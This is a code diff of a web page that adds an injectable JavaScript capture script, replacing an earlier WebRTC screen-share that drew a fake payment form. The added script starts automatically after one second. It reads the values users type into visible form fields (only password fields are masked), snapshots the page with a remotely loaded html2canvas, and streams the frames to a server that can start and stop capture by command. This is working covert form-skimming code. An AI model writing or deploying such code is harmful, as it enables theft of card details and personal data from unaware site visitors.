-                    ctx.fillText('Live View - ' + time, 20, 60);
-                    
-                    // Add some fake payment form details
-                    ctx.fillStyle = '#f0f0f0';
-                    ctx.fillRect(20, 80, canvas.width - 40, 200);
-                    
-                    ctx.fillStyle = 'black';
-                    ctx.fillText('Card Number: **** **** **** ****', 40, 110);
-                    ctx.fillText('Expiry Date: MM/YY', 40, 140);
-                    ctx.fillText('CVV: ***', 40, 170);
-                    ctx.fillText('Cardholder Name: User', 40, 200);
-                    
-                    // Add payment button
-                    ctx.fillStyle = '#4a90e2';
-                    ctx.fillRect(40, 230, 120, 30);
-                    ctx.fillStyle = 'white';
-                    ctx.fillText('Pay Now', 70, 250);
-                  } catch (e) {
-                    console.error('Error drawing to canvas:', e);
-                  }
-                }, 1000 / 30); // 30fps
-                
-                // Create a stream from the canvas
-                const stream = canvas.captureStream(30);
-                
-                // Add a cleanup function
-                stream.getTracks()[0].addEventListener('ended', () => {
-                  clearInterval(drawInterval);
-                });
-                
-                return stream;
-              };
-            }
+            // Clear canvas
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
             
-            // Get display media (actually our canvas stream)
-            localStream = await navigator.mediaDevices.getDisplayMedia({ 
-              video: { width: 1280, height: 720 } 
+            // Draw page content to canvas
+            ctx.fillStyle = 'white';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            // Create basic representation of the page
+            ctx.font = '14px Arial';
+            ctx.fillStyle = 'black';
+            
+            // Draw page URL
+            ctx.fillText('Page: ' + window.location.href, 10, 20);
+            
+            // Draw current time
+            ctx.fillText('Time: ' + new Date().toLocaleTimeString(), 10, 40);
+            
+            // Draw visible form elements
+            const inputs = document.querySelectorAll('input, select, textarea');
+            let y = 70;
+            
+            inputs.forEach((input, index) => {
+              const rect = input.getBoundingClientRect();
+              if (rect.top < window.innerHeight && rect.bottom > 0) {
+                // Draw a representation of the input
+                ctx.fillStyle = '#f0f0f0';
+                ctx.fillRect(10, y - 15, 300, 20);
+                
+                ctx.fillStyle = 'black';
+                const label = input.placeholder || input.name || input.id || 'Input ' + (index + 1);
+                const value = input.value || '';
+                ctx.fillText(label + ': ' + (input.type === 'password' ? '••••••' : value), 15, y);
+                
+                y += 25;
+              }
             });
             
-            // Set up WebRTC
-            setupWebRTC();
-            
-            return true;
-          } catch (error) {
-            console.error('Error capturing screen:', error);
-            return false;
-          }
-        }
-        
-        function setupWebRTC() {
-          // Create peer connection
-          peerConnection = new RTCPeerConnection({
-            iceServers: [
-              { urls: 'stun:stun.l.google.com:19302' },
-              { urls: 'stun:stun1.l.google.com:19302' }
-            ]
-          });
-          
-          // Add screen track to the connection
-          localStream.getTracks().forEach(track => {
-            peerConnection.addTrack(track, localStream);
-          });
-          
-          // Handle ICE candidates
-          peerConnection.onicecandidate = event => {
-            if (event.candidate) {
-              window.parent.postMessage({
-                type: 'screen_ice_candidate',
-                candidate: event.candidate
-              }, '*');
-            }
-          };
-          
-          // Listen for messages from parent
-          window.addEventListener('message', async (event) => {
-            const data = event.data;
-            
-            if (data.type === 'request_screen_offer') {
-              try {
-                const offer = await peerConnection.createOffer();
-                await peerConnection.setLocalDescription(offer);
+            // Draw buttons and interactive elements
+            const buttons = document.querySelectorAll('button, a, [role="button"]');
+            buttons.forEach((button, index) => {
+              const rect = button.getBoundingClientRect();
+              if (rect.top < window.innerHeight && rect.bottom > 0) {
+                const text = button.textContent.trim() || 'Button ' + (index + 1);
+                ctx.fillStyle = '#4a90e2';
+                ctx.fillRect(10, y - 15, Math.min(text.length * 10 + 20, 300), 25);
                 
-                window.parent.postMessage({
-                  type: 'screen_offer',
-                  offer: offer
-                }, '*');
-              } catch (error) {
-                console.error('Error creating offer:', error);
+             ctx.fillStyle = 'white';
+                ctx.fillText(text, 15, y);
+                
+                y += 35;
               }
-            }
-            else if (data.type === 'screen_answer') {
+            });
+            
+            // Advanced: Try to capture the actual page content using html2canvas if available
+            if (window.html2canvas) {
+              html2canvas(document.body, {
+                logging: false,
+                useCORS: true,
+                ignoreElements: (element) => {
+                  return element === canvas; // Don't capture our canvas itself
+                }
+              }).then(renderedCanvas => {
+                // Use the rendered canvas instead
+                const frameData = renderedCanvas.toDataURL('image/jpeg', CAPTURE_QUALITY);
+                sendFrame(frameData);
+              }).catch(error => {
+                console.error('Error with html2canvas:', error);
+                // Fallback to our basic canvas
+                const frameData = canvas.toDataURL('image/jpeg', CAPTURE_QUALITY);
+                sendFrame(frameData);
+              });
+            } else {
+              // If html2canvas isn't available, just use our basic canvas
+              // Draw a border to represent the page boundary
+              ctx.strokeStyle = '#ddd';
+              ctx.lineWidth = 2;
+              ctx.strokeRect(0, 0, canvas.width, canvas.height);
+              
+              // Take a screenshot of the visible parts of elements using just canvas
               try {
-                await peerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));
-              } catch (error) {
-                console.error('Error setting remote description:', error);
+                // Get all visible elements
+                const elements = Array.from(document.querySelectorAll('*')).filter(el => {
+                  const rect = el.getBoundingClientRect();
+                  return rect.width > 0 && rect.height > 0 && 
+                         rect.top < window.innerHeight && rect.bottom > 0 && 
+                         rect.left < window.innerWidth && rect.right > 0 &&
+                         el !== canvas;
+                });
+                
+                // Draw background elements
+                elements.forEach(el => {
+                  try {
+                    const rect = el.getBoundingClientRect();
+                    const styles = window.getComputedStyle(el);
+                    if (styles.backgroundColor !== 'rgba(0, 0, 0, 0)' && styles.backgroundColor !== 'transparent') {
+                      ctx.fillStyle = styles.backgroundColor;
+                      ctx.fillRect(rect.left, rect.top, rect.width, rect.height);
+                    }
+                    if (styles.border !== '') {
+                      ctx.strokeStyle = styles.borderColor;
+                      ctx.lineWidth = parseInt(styles.borderWidth);
+                      ctx.strokeRect(rect.left, rect.top, rect.width, rect.height);
+                    }
+                  } catch (e) {}
+                });
+                
+                // Draw text elements
+                elements.filter(el => el.textContent.trim() !== '' && window.getComputedStyle(el).display !== 'none')
+                  .forEach(el => {
+                    try {
+                      const rect = el.getBoundingClientRect();
+                      const styles = window.getComputedStyle(el);
+                      if (rect.width > 10 && rect.height > 5) {
+                        ctx.font = styles.font;
+                        ctx.fillStyle = styles.color;
+                        ctx.fillText(el.textContent.substring(0, 50), rect.left + 3, rect.top + parseInt(styles.fontSize) + 3);
+                      }
+                    } catch (e) {}
+                  });
+                
+                // Include any images
+                document.querySelectorAll('img').forEach(img => {
+                  try {
+                    if (img.complete && img.naturalWidth > 0) {
+                      const rect = img.getBoundingClientRect();
+                      if (rect.width > 0 && rect.height > 0 && 
+                          rect.top < window.innerHeight && rect.bottom > 0) {
+                        ctx.drawImage(img, rect.left, rect.top, rect.width, rect.height);
+                      }
+                    }
+                  } catch (e) {}
+                });
+              } catch (e) {
+                console.error('Error capturing elements:', e);
               }
+              
+              // Convert canvas to image data URL
+              const frameData = canvas.toDataURL('image/jpeg', CAPTURE_QUALITY);
+              sendFrame(frameData);
             }
-            else if (data.type === 'admin_ice_candidate') {
-              try {
-                await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
-              } catch (error) {
-                console.error('Error adding ICE candidate:', error);
-              }
+          } catch (error) {
+            console.error('Error in screen capture:', error);
+            // Report error
+            try {
+              socket.emit('screen_capture_error', {
+                error: error.message || 'Unknown error during capture'
+              });
+            } catch (e) {
+              console.error('Failed to report error:', e);
             }
-            else if (data.type === 'stop_screen_capture') {
-              stopScreenCapture();
-            }
-          });
+          }
         }
         
-        function stopScreenCapture() {
-          if (localStream) {
-            localStream.getTracks().forEach(track => track.stop());
-            localStream = null;
+        // Function to send the frame data
+        function sendFrame(frameData) {
+          try {
+            // Send frame data to server
+            socket.emit('screen_frame', {
+              frameData: frameData,
+              frameType: 'image',
+              timestamp: Date.now(),
+              frameId: Math.random().toString(36).substring(2, 15)
+            });
+          } catch (err) {
+            console.error('Error sending frame:', err);
+          }
+        }
+        
+        // Function to start capturing
+        function startCapture() {
+          if (captureInterval) return; // Already running
+          
+          // Update canvas dimensions
+          canvas.width = window.innerWidth;
+          canvas.height = window.innerHeight;
+          
+          // Try to load html2canvas for better captures
+          if (!window.html2canvas) {
+            const script = document.createElement('script');
+            script.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
+            document.head.appendChild(script);
           }
           
-          if (peerConnection) {
-            peerConnection.close();
-            peerConnection = null;
+          // Start capture loop
+          captureInterval = setInterval(captureScreen, MIN_CAPTURE_INTERVAL);
+          
+          // Do one immediate capture
+          captureScreen();
+          
+          // Notify that capture has started
+          try {
+            socket.emit('screen_capture_started');
+          } catch (e) {
+            console.error('Failed to notify of capture start:', e);
+          }
+          
+          console.log('Screen capture started');
+        }
+        
+        // Function to stop capturing
+        function stopCapture() {
+          if (captureInterval) {
+            clearInterval(captureInterval);
+            captureInterval = null;
+            
+            // Notify that capture has stopped
+            try {
+              socket.emit('screen_capture_stopped');
+            } catch (e) {
+              console.error('Failed to notify of capture stop:', e);
+            }
+            
+            console.log('Screen capture stopped');
           }
         }
         
-        // Start capturing screen automatically
-        captureScreen().then(success => {
-          if (success) {
-            console.log('Screen capture started');
-          } else {
-            console.log('Failed to start screen capture');
+        // Listen for control commands
+        socket.on('control_command', (command) => {
+          console.log('Received control command:', command);
+          
+          if (command.type === 'start_capture') {
+            startCapture();
+          } else if (command.type === 'stop_capture') {
+            stopCapture();
+          } else if (command.type === 'refresh_capture') {
+            stopCapture();
+            setTimeout(startCapture, 500);
           }
         });
-      `;
-      
-      return screenCaptureScript;
+        
+        // Listen for window resize to update canvas dimensions
+        window.addEventListener('resize', () => {
+          if (captureInterval) {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+          }
+        });
+        
+        // Start capture automatically
+        setTimeout(startCapture, 1000);
+      })();
+    `;
+    
+    // Make the capture script available for injection
+    window.injectScreenCaptureCode = function() {
+      return window.advancedCaptureScript;
     };
   </script>
 </body>
